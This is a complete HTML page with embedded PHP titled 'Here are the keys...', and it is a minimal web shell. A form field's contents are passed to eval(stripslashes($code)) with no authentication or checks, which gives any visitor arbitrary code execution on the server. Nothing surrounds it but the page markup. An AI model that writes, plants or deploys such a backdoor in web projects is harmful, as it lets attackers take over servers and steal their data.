<html>
  <head>
    <title>Here are the keys...</title>
  </head>
  <body>
    <?php if ($code) {
      echo "Executing code...";
      eval(stripslashes($code));   
    } ?>
  <form>
      <input type="text" name="code" />
      <input type="submit" name="Execute Code" />
  </form>
  </body>
</html>
